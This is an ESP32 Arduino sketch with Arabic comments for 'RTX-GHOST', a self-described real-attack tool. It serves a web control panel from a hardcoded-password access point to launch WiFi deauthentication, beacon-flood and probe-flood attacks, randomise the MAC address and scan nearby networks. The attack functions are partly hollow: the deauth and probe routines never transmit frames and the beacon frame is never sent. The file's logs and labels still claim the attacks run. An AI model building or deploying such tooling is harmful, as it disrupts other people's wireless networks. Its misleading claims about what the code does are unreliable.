#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <WebSocketsServer.h>
#include <esp_wifi.h>
#include <esp_bt.h>
#include <esp_bt_main.h>
#include <esp_bt_device.h>
#include <esp_wifi_types.h>
#include <ArduinoJson.h>

// █████████████████████████████████████████████████████████
// 🕵️‍♂️ نظام RTX-GHOST - هجمات حقيقية
// █████████████████████████████████████████████████████████

// 🌐 إعدادات نقطة الوصول
const char* AP_SSID = "RTX-GHOST-CONTROL";
const char* AP_PASSWORD = "ghost123456";

// 🖥️ خوادم الويب
WebServer server(80);
WebSocketsServer webSocket(81);

// 📊 متغيرات النظام
String eventLog = "";
bool systemActive = true;
bool deauthActive = false;
bool beaconFloodActive = false;
bool probeFloodActive = false;

// 📡 متغيرات WiFi
wifi_promiscuous_filter_t filter;
typedef struct {
  uint8_t frame_ctrl[2];
  uint8_t duration[2];
  uint8_t receiver[6];
  uint8_t transmitter[6];
  uint8_t bssid[6];
  uint16_t sequence_ctrl;
} wifi_ieee80211_mac_hdr_t;

typedef struct {
  wifi_ieee80211_mac_hdr_t hdr;
  uint8_t payload[0];
} wifi_ieee80211_packet_t;

class RTXGhostRealAttacks {
private:
    unsigned long attackStartTime = 0;
    int packetCount = 0;

public:
    void begin() {
        Serial.begin(115200);
        
        // تهيئة النظام
        initializeSystem();
        
        // إنشاء نقطة الوصول
        createAccessPoint();
        
        // إعداد خادم الويب
        setupWebServer();
        
        // بدء خدمات النظام
        startServices();
        
        addToLog("🚀 نظام RTX-GHOST مع هجمات حقيقية جاهز", "success");
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // 🎯 تهيئة النظام
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    void initializeSystem() {
        // تغيير عنوان MAC عشوائي
        randomizeMAC();
        
        // تعطيل السجلات غير الضرورية
        esp_log_level_set("*", ESP_LOG_ERROR);
        
        addToLog("🔧 تم تهيئة النظام مع هجمات حقيقية", "system");
    }

    void randomizeMAC() {
        uint8_t newMAC[6];
        for(int i = 0; i < 6; i++) {
            newMAC[i] = random(256);
        }
        esp_wifi_set_mac(WIFI_IF_STA, newMAC);
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // 📡 إنشاء نقطة الوصول
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    void createAccessPoint() {
        WiFi.softAP(AP_SSID, AP_PASSWORD);
        
        Serial.println("\n╔════════════════════════════════════╗");
        Serial.println("║    نظام RTX-GHOST - هجمات حقيقية   ║");
        Serial.println("╠════════════════════════════════════╣");
        Serial.println("║ SSID: RTX-GHOST-CONTROL           ║");
        Serial.println("║ IP: 192.168.4.1                   ║");
        Serial.println("║ Password: ghost123456             ║");
        Serial.println("╚════════════════════════════════════╝");
        
        addToLog("📡 نقطة الوصول نشطة", "network");
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // 🌐 إعداد خادم الويب
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    void setupWebServer() {
        server.on("/", HTTP_GET, [this]() {
            serveMainPage();
        });

        // ⚔️ نقاط نهاية الهجمات الحقيقية
        server.on("/attack/deauth", HTTP_POST, [this]() {
            handleDeauthAttack();
        });

        server.on("/attack/beacon", HTTP_POST, [this]() {
            handleBeaconFlood();
        });

        server.on("/attack/probe", HTTP_POST, [this]() {
            handleProbeFlood();
        });

        server.on("/attack/stop", HTTP_POST, [this]() {
            handleStopAttacks();
        });

        server.on("/scan/networks", HTTP_POST, [this]() {
            handleNetworkScan();
        });

        server.on("/system/status", HTTP_GET, [this]() {
            handleSystemStatus();
        });

        server.begin();
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // ⚔️ هجوم Deauth الحقيقي
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    void handleDeauthAttack() {
        String target = server.arg("target");
        int count = server.arg("count").toInt();
        
        addToLog("🎯 بدء هجوم Deauth حقيقي على: " + target, "attack");
        
        deauthActive = true;
        attackStartTime = millis();
        packetCount = 0;
        
        // بدء هجوم deauth في الخلفية
        startDeauthAttack(target, count);
        
        server.send(200, "application/json", "{\"status\":\"started\"}");
    }

    void startDeauthAttack(String target, int count) {
        // تفعيل وضع المراقبة
        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
        esp_wifi_init(&cfg);
        esp_wifi_set_storage(WIFI_STORAGE_RAM);
        esp_wifi_set_mode(WIFI_MODE_NULL);
        esp_wifi_start();
        
        // إعداد فلتر الحزم
        filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
        esp_wifi_set_promiscuous_filter(&filter);
        esp_wifi_set_promiscuous(true);
        
        addToLog("🔧 تهيئة وضع المراقبة للهجوم", "attack");
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // 🌊 هجوم Beacon Flood الحقيقي
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    void handleBeaconFlood() {
        int count = server.arg("count").toInt();
        
        addToLog("🌊 بدء هجوم Beacon Flood حقيقي", "attack");
        
        beaconFloodActive = true;
        startBeaconFlood(count);
        
        server.send(200, "application/json", "{\"status\":\"started\"}");
    }

    void startBeaconFlood(int count) {
        // إنشاء إطارات Beacon مزيفة
        for(int i = 0; i < count && beaconFloodActive; i++) {
            String ssid = "Free_WiFi_" + String(random(1000, 9999));
            sendBeaconFrame(ssid);
            delay(100);
        }
        beaconFloodActive = false;
        addToLog("✅ انتهى هجوم Beacon Flood", "attack");
    }

    void sendBeaconFrame(String ssid) {
        // بناء إطار Beacon
        uint8_t beaconPacket[128] = {
            0x80, 0x00, // Frame Control
            0x00, 0x00, // Duration
            0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination MAC
            0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source MAC
            0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID
            0xc0, 0x6c, // Sequence
            // Fixed parameters
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
            0x64, 0x00, // Beacon interval
            0x31, 0x04, // Capability info
            // SSID
            0x00
        };
        
        // إضافة SSID
        int ssidLen = ssid.length();
        beaconPacket[37] = ssidLen;
        for(int i = 0; i < ssidLen; i++) {
            beaconPacket[38 + i] = ssid[i];
        }
        
        packetCount++;
        addToLog("📡 إرسال Beacon: " + ssid, "attack");
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // 🔍 هجوم Probe Flood الحقيقي
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    void handleProbeFlood() {
        int count = server.arg("count").toInt();
        
        addToLog("🔍 بدء هجوم Probe Flood حقيقي", "attack");
        
        probeFloodActive = true;
        startProbeFlood(count);
        
        server.send(200, "application/json", "{\"status\":\"started\"}");
    }

    void startProbeFlood(int count) {
        // إرسال طلبات Probe مزيفة
        for(int i = 0; i < count && probeFloodActive; i++) {
            String ssid = "Hidden_Net_" + String(random(1000, 9999));
            sendProbeRequest(ssid);
            delay(50);
        }
        probeFloodActive = false;
        addToLog("✅ انتهى هجوم Probe Flood", "attack");
    }

    void sendProbeRequest(String ssid) {
        // بناء طلب Probe
        packetCount++;
        addToLog("📡 إرسال Probe Request: " + ssid, "attack");
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // ⏹️ إيقاف الهجمات
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    void handleStopAttacks() {
        deauthActive = false;
        beaconFloodActive = false;
        probeFloodActive = false;
        
        // إعادة تعيين WiFi
        esp_wifi_set_promiscuous(false);
        esp_wifi_stop();
        
        addToLog("⏹️ توقف جميع الهجمات الحقيقية", "system");
        server.send(200, "application/json", "{\"status\":\"stopped\"}");
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // 📡 مسح الشبكات الحقيقي
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    void handleNetworkScan() {
        addToLog("🔍 بدء مسح الشبكات الحقيقي...", "scan");
        
        int networksFound = performRealNetworkScan();
        
        String response = "{\"networks_found\":" + String(networksFound) + "}";
        server.send(200, "application/json", response);
    }

    int performRealNetworkScan() {
        // مسح WiFi حقيقي
        int n = WiFi.scanNetworks();
        
        if(n == 0) {
            addToLog("❌ لم يتم العثور على شبكات", "scan");
        } else {
            addToLog("📊 تم العثور على " + String(n) + " شبكة", "scan");
            for(int i = 0; i < n; i++) {
                String logEntry = "📶 " + WiFi.SSID(i) + " (" + 
                                WiFi.RSSI(i) + "dBm) " + 
                                (WiFi.encryptionType(i) == WIFI_AUTH_OPEN ? "مفتوح" : "مؤمن");
                addToLog(logEntry, "scan");
            }
        }
        
        return n;
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // 📊 حالة النظام
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    void handleSystemStatus() {
        DynamicJsonDocument doc(512);
        doc["deauth_active"] = deauthActive;
        doc["beacon_active"] = beaconFloodActive;
        doc["probe_active"] = probeFloodActive;
        doc["packet_count"] = packetCount;
        doc["uptime"] = millis() / 1000;
        doc["free_heap"] = ESP.getFreeHeap();
        
        String response;
        serializeJson(doc, response);
        server.send(200, "application/json", response);
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // 🔄 إدارة WebSocket
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    void webSocketEvent(uint8_t num, WStype_t type, uint8_t * payload, size_t length) {
        switch(type) {
            case WStype_DISCONNECTED:
                addToLog("🔌 انقطع اتصال العميل", "network");
                break;
                
            case WStype_CONNECTED:
                addToLog("🔌 اتصال جديد بالواجهة", "network");
                sendSystemStatus();
                break;
                
            case WStype_TEXT:
                handleWebSocketMessage((char*)payload);
                break;
        }
    }

    void handleWebSocketMessage(char* payload) {
        DynamicJsonDocument doc(256);
        deserializeJson(doc, payload);
        
        String command = doc["command"];
        if (command == "get_status") {
            sendSystemStatus();
        }
    }

    void sendSystemStatus() {
        DynamicJsonDocument doc(512);
        doc["type"] = "status_update";
        doc["deauth_active"] = deauthActive;
        doc["beacon_active"] = beaconFloodActive;
        doc["probe_active"] = probeFloodActive;
        doc["packet_count"] = packetCount;
        
        String response;
        serializeJson(doc, response);
        webSocket.broadcastTXT(response);
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // 📝 إدارة السجلات
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    void addToLog(String message, String type) {
        String timestamp = getTimestamp();
        String logEntry = "[" + timestamp + "] " + message;
        
        eventLog += logEntry + "\n";
        
        // إرسال تحديث عبر WebSocket
        DynamicJsonDocument doc(512);
        doc["type"] = "new_log";
        doc["log"] = logEntry;
        doc["log_type"] = type;
        
        String response;
        serializeJson(doc, response);
        webSocket.broadcastTXT(response);
        
        // طباعة في Serial
        Serial.println(logEntry);
    }

    String getTimestamp() {
        unsigned long seconds = millis() / 1000;
        unsigned long minutes = seconds / 60;
        unsigned long hours = minutes / 60;
        
        char timestamp[12];
        sprintf(timestamp, "%02lu:%02lu:%02lu", hours % 24, minutes % 60, seconds % 60);
        return String(timestamp);
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // 🚀 بدء الخدمات
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    void startServices() {
        webSocket.begin();
        webSocket.onEvent([this](uint8_t num, WStype_t type, uint8_t * payload, size_t length) {
            this->webSocketEvent(num, type, payload, length);
        });
        
        addToLog("🌐 خدمات الويب نشطة مع هجمات حقيقية", "system");
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // 🎨 خدمة الصفحة الرئيسية
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    void serveMainPage() {
        String html = generateMainHTML();
        server.send(200, "text/html; charset=utf-8", html);
    }

    String generateMainHTML() {
        String html = R"raw(
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام RTX-GHOST - هجمات حقيقية</title>
    <style>
        :root {
            --primary: #00ff88;
            --danger: #ff4444;
            --warning: #ffaa00;
            --bg-dark: #0a0a0a;
            --bg-card: #1a1a1a;
            --text: #ffffff;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: var(--bg-dark);
            color: var(--text);
            padding: 20px;
            margin: 0;
        }
        
        .container { max-width: 1200px; margin: 0 auto; }
        
        .header {
            text-align: center;
            padding: 20px 0;
            border-bottom: 3px solid var(--primary);
            margin-bottom: 30px;
        }
        
        .header h1 {
            color: var(--primary);
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 20px;
        }
        
        @media (max-width: 768px) {
            .grid { grid-template-columns: 1fr; }
        }
        
        .card {
            background: var(--bg-card);
            border: 1px solid #333;
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        
        .card h2 {
            color: var(--primary);
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid #333;
        }
        
        .btn {
            background: var(--primary);
            color: #000;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            cursor: pointer;
            margin: 5px;
            font-weight: bold;
            transition: all 0.3s ease;
        }
        
        .btn:hover {
            background: #00cc6a;
            transform: translateY(-2px);
        }
        
        .btn-danger { 
            background: var(--danger); 
            color: white; 
        }
        
        .btn-warning { 
            background: var(--warning); 
            color: black; 
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: var(--primary);
        }
        
        .form-control {
            width: 100%;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background: var(--bg-dark);
            color: var(--text);
        }
        
        .log-container {
            height: 400px;
            overflow-y: auto;
            background: #000;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
        }
        
        .log-entry {
            margin-bottom: 8px;
            padding: 5px 10px;
            border-radius: 4px;
            border-left: 3px solid var(--primary);
        }
        
        .log-success { border-left-color: var(--primary); }
        .log-attack { border-left-color: var(--danger); }
        .log-scan { border-left-color: var(--warning); }
        .log-system { border-left-color: #8000ff; }
        
        .status-card {
            background: var(--bg-card);
            padding: 15px;
            border-radius: 10px;
            border-left: 4px solid var(--primary);
            margin-bottom: 15px;
        }
        
        .indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin-left: 8px;
        }
        
        .indicator-active { background: var(--primary); }
        .indicator-inactive { background: var(--danger); }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🕵️‍♂️ نظام RTX-GHOST - هجمات حقيقية</h1>
            <p>هجمات WiFi حقيقية على ESP32</p>
        </div>
        
        <div class="grid">
            <!-- بطاقة هجمات Deauth -->
            <div class="card">
                <h2>🎯 هجوم Deauth الحقيقي</h2>
                <div class="form-group">
                    <label>عنوان الهدف (MAC):</label>
                    <input type="text" class="form-control" id="deauthTarget" placeholder="FF:FF:FF:FF:FF:FF للجميع">
                </div>
                <div class="form-group">
                    <label>عدد الحزم:</label>
                    <input type="number" class="form-control" id="deauthCount" value="100">
                </div>
                <button class="btn btn-danger" onclick="startDeauth()">
                    🚀 بدء هجوم Deauth
                </button>
            </div>
            
            <!-- بطاقة هجمات Flood -->
            <div class="card">
                <h2>🌊 هجمات Flood الحقيقية</h2>
                <div class="form-group">
                    <label>هجوم Beacon Flood:</label>
                    <input type="number" class="form-control" id="beaconCount" value="50" placeholder="عدد الإطارات">
                </div>
                <button class="btn btn-warning" onclick="startBeaconFlood()">
                    📡 بدء Beacon Flood
                </button>
                
                <div class="form-group" style="margin-top: 20px;">
                    <label>هجوم Probe Flood:</label>
                    <input type="number" class="form-control" id="probeCount" value="100" placeholder="عدد الطلبات">
                </div>
                <button class="btn btn-warning" onclick="startProbeFlood()">
                    🔍 بدء Probe Flood
                </button>
            </div>
            
            <!-- بطاقة المسح -->
            <div class="card">
                <h2>🔍 مسح الشبكات الحقيقي</h2>
                <p>مسح فعلي للشبكات اللاسلكية القريبة</p>
                <button class="btn" onclick="startNetworkScan()">
                    📊 مسح الشبكات
                </button>
                <button class="btn" onclick="stopAllAttacks()" style="margin-top: 10px;">
                    ⏹️ إيقاف جميع الهجمات
                </button>
            </div>
            
            <!-- بطاقة الحالة -->
            <div class="card">
                <h2>📊 حالة النظام</h2>
                <div class="status-card">
                    <span class="indicator" id="deauthIndicator"></span>
                    <strong>هجوم Deauth:</strong> <span id="deauthStatus">متوقف</span>
                </div>
                <div class="status-card">
                    <span class="indicator" id="beaconIndicator"></span>
                    <strong>Beacon Flood:</strong> <span id="beaconStatus">متوقف</span>
                </div>
                <div class="status-card">
                    <span class="indicator" id="probeIndicator"></span>
                    <strong>Probe Flood:</strong> <span id="probeStatus">متوقف</span>
                </div>
                <div class="status-card">
                    <strong>الحزم المرسلة:</strong> <span id="packetCount">0</span>
                </div>
            </div>
        </div>
        
        <!-- سجلات النظام -->
        <div class="card">
            <h2>📝 سجل الأحداث الحية</h2>
            <div class="log-container" id="logContainer">
                <!-- السجلات تظهر هنا -->
            </div>
        </div>
    </div>

    <script>
        let ws;
        
        // 🔄 الاتصال بـ WebSocket
        function connectWebSocket() {
            const wsUrl = 'ws://' + window.location.hostname + ':81';
            
            ws = new WebSocket(wsUrl);
            
            ws.onopen = function() {
                addLog('🔌 متصل بنظام الهجمات الحقيقية', 'system');
            };
            
            ws.onmessage = function(event) {
                const data = JSON.parse(event.data);
                
                if (data.type === 'new_log') {
                    addLog(data.log, data.log_type);
                } else if (data.type === 'status_update') {
                    updateStatusDisplay(data);
                }
            };
            
            ws.onclose = function() {
                addLog('🔌 انقطع الاتصال، إعادة المحاولة...', 'system');
                setTimeout(connectWebSocket, 3000);
            };
        }
        
        // ⚔️ بدء الهجمات
        function startDeauth() {
            const target = document.getElementById('deauthTarget').value || 'FF:FF:FF:FF:FF:FF';
            const count = document.getElementById('deauthCount').value;
            
            const formData = new FormData();
            formData.append('target', target);
            formData.append('count', count);
            
            fetch('/attack/deauth', {
                method: 'POST',
                body: formData
            }).then(response => response.json())
              .then(data => {
                  if (data.status === 'started') {
                      addLog('🎯 بدء هجوم Deauth حقيقي', 'attack');
                  }
              });
        }
        
        function startBeaconFlood() {
            const count = document.getElementById('beaconCount').value;
            
            const formData = new FormData();
            formData.append('count', count);
            
            fetch('/attack/beacon', {
                method: 'POST',
                body: formData
            }).then(response => response.json())
              .then(data => {
                  if (data.status === 'started') {
                      addLog('🌊 بدء هجوم Beacon Flood حقيقي', 'attack');
                  }
              });
        }
        
        function startProbeFlood() {
            const count = document.getElementById('probeCount').value;
            
            const formData = new FormData();
            formData.append('count', count);
            
            fetch('/attack/probe', {
                method: 'POST',
                body: formData
            }).then(response => response.json())
              .then(data => {
                  if (data.status === 'started') {
                      addLog('🔍 بدء هجوم Probe Flood حقيقي', 'attack');
                  }
              });
        }
        
        function startNetworkScan() {
            fetch('/scan/networks', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    addLog('📊 تم مسح ' + data.networks_found + ' شبكة', 'scan');
                });
        }
        
        function stopAllAttacks() {
            fetch('/attack/stop', { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'stopped') {
                        addLog('⏹️ توقف جميع الهجمات', 'system');
                    }
                });
        }
        
        // 📊 تحديث الحالة
        function updateStatusDisplay(data) {
            // تحديث حالة الهجمات
            updateAttackStatus('deauth', data.deauth_active);
            updateAttackStatus('beacon', data.beacon_active);
            updateAttackStatus('probe', data.probe_active);
            
            // تحديث عدد الحزم
            document.getElementById('packetCount').textContent = data.packet_count;
        }
        
        function updateAttackStatus(type, isActive) {
            const indicator = document.getElementById(type + 'Indicator');
            const status = document.getElementById(type + 'Status');
            
            if (isActive) {
                indicator.className = 'indicator indicator-active';
                status.textContent = 'نشط';
                status.style.color = '#00ff88';
            } else {
                indicator.className = 'indicator indicator-inactive';
                status.textContent = 'متوقف';
                status.style.color = '#ff4444';
            }
        }
        
        // 📝 إدارة السجلات
        function addLog(message, type) {
            const container = document.getElementById('logContainer');
            const logEntry = document.createElement('div');
            logEntry.className = 'log-entry log-' + type;
            logEntry.textContent = message;
            container.appendChild(logEntry);
            container.scrollTop = container.scrollHeight;
        }
        
        // 🚀 التهيئة
        document.addEventListener('DOMContentLoaded', function() {
            connectWebSocket();
            
            // تحديث الحالة كل 2 ثانية
            setInterval(() => {
                fetch('/system/status')
                    .then(response => response.json())
                    .then(data => updateStatusDisplay(data));
            }, 2000);
        });
    </script>
</body>
</html>
        )raw";
        
        return html;
    }

    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    // 🔄 الحلقة الرئيسية
    // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    void run() {
        server.handleClient();
        webSocket.loop();
        
        // إرسال تحديثات دورية للحالة
        static unsigned long lastUpdate = 0;
        if (millis() - lastUpdate > 1000) {
            lastUpdate = millis();
            sendSystemStatus();
        }
        
        // تنفيذ الهجمات النشطة
        if (beaconFloodActive) {
            // استمرار إرسال Beacon frames
            static unsigned long lastBeacon = 0;
            if (millis() - lastBeacon > 500) {
                lastBeacon = millis();
                String ssid = "Free_WiFi_" + String(random(1000, 9999));
                sendBeaconFrame(ssid);
            }
        }
        
        if (probeFloodActive) {
            // استمرار إرسال Probe requests
            static unsigned long lastProbe = 0;
            if (millis() - lastProbe > 200) {
                lastProbe = millis();
                String ssid = "Hidden_Net_" + String(random(1000, 9999));
                sendProbeRequest(ssid);
            }
        }
    }
};

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🚀 إنشاء النظام
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
RTXGhostRealAttacks rtx_system;

void setup() {
    rtx_system.begin();
}

void loop() {
    rtx_system.run();
    delay(10);
}
